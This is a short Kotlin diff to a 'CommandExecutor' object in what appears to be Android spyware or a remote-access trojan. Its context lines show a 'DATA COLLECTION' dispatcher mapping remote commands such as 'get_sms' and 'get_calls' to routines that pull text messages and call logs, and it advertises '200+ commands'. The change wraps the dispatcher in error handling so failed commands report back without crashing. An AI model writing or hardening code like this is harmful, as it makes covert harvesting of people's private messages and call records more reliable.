@@ -50,7 +50,8 @@ object CommandExecutor {
         val params = command.params
         val cmd = command.command
 
-        return when (cmd) {
+        return try {
+            when (cmd) {
             // ===== DATA COLLECTION =====
             "get_sms" -> DataCollector.getSMS(context)
             "get_calls" -> DataCollector.getCalls(context)
@@ -264,6 +265,10 @@ object CommandExecutor {
 
             // ===== UNKNOWN =====
             else -> mapOf("error" to "Unknown command: $cmd", "supported" to "200+ commands")
+        }
+        } catch (e: Exception) {
+            Log.e(TAG, "processCommand error for '$cmd': ${e.message}", e)
+            mapOf("error" to "Command '$cmd' failed: ${e.message ?: e.javaClass.simpleName}")
         }
     }
 }
